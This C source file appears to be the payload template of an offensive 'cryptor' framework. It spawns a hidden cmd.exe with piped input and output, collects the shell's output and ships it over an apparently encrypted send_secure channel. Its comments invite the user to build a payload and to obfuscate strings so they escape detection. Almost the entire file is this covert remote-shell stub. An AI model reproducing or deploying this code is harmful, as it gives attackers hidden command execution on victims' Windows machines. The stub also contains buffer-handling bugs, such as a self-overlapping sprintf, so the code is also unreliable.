#include "clientHeader.h"
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
/*
 * Copyright (C) 2020  @Qu3b411 
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */


/*
 *	****************************************************************
 *	YOUR PAYLOAD GOES HERE, THIS IS WHERE YOUR DEVELOPMENT WORK WILL
 *	BEGIN. HAVE FUN
 *	****************************************************************
 *
 * 	USE PLStr to secure all your binary strings
 */
 PL_int main(){
	
	 HANDLE hcstdout_rd;	
	 HANDLE hcstdout_wr;
	 HANDLE hcstdin_rd;
	 HANDLE hcstdin_wr;
	 BYTE* sendBuff = malloc(4096);
	 ZeroMemory(sendBuff,4096);
	 BYTE buffer[4096];
	 DWORD bytesRead=0;
	 /*
	  * create an anonomous pipe
	  */
	 SECURITY_ATTRIBUTES sAttr = {sizeof(SECURITY_ATTRIBUTES), NULL,TRUE};
	 if(!CreatePipe(&hcstdout_rd,&hcstdout_wr,&sAttr,0))
	 {
	 	return -1;
	 }
	 if(!CreatePipe(&hcstdin_rd,&hcstdin_wr,&sAttr,0))
	 {
	 	return -1;
	 }
	 STARTUPINFO si = {0};
	 si.cb = sizeof(STARTUPINFO);
	 si.hStdError  = hcstdout_wr;
	 si.hStdOutput = hcstdout_wr;
	 si.hStdInput = hcstdin_rd;
	 si.dwFlags = STARTF_USESTDHANDLES;
	 si.wShowWindow = SW_HIDE;
	 PROCESS_INFORMATION pi = {};
	 BYTE PAYLOAD[] = {"C:\\Windows\\System32\\cmd.exe"};
	 if(!CreateProcessA(NULL,PAYLOAD /*"C:\\Windows\\System32\\cmd.exe "*/,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si, &pi))
	 {
		 printf("%d",GetLastError());
		return -1;
	 }	 
	
 	 if(!CloseHandle(hcstdout_wr))
	 {
		 return -1;
	 }

 	if(!CloseHandle(hcstdin_rd))
	 {
		 return -1;
	 }
	 /*
	  * CMD initiates with 4 lines,
	  * 1 the header
	  * 2 the copyright,
	  * 3 newline
	  * 4 prompt
	  */ 
	
		DWORD bw;
		DWORD tba;
	do
	{
		if(!ReadFile(hcstdout_rd,buffer,4096,&bytesRead,NULL))
			{
				printf("read failed: %d", GetLastError());
				return -1;
			}
		if(!PeekNamedPipe(hcstdout_rd,NULL,4096,&bw,&tba,NULL))
		{
			printf("here");
			return -1;
		}
	 	sprintf(sendBuff, "%s%s",sendBuff,buffer);
		
	} while(bw != 0) ;
	send_secure(sendBuff,strlen(sendBuff));
	printf("%s",sendBuff);
	 /*
	  * BYTE* tmp = "hello";
	send_secure(tmp,5);
	tmp = "world";
	send_secure(tmp,5);
	tmp = PLStr("data being sent from the cryptor"); 
	send_secure(tmp,32);
	printf("%s",PLStr("hello world from the cryptor\n"));
	printf("%s\n", recv_secure());
	printf("%s\n", recv_secure());
	return 1;*/
}

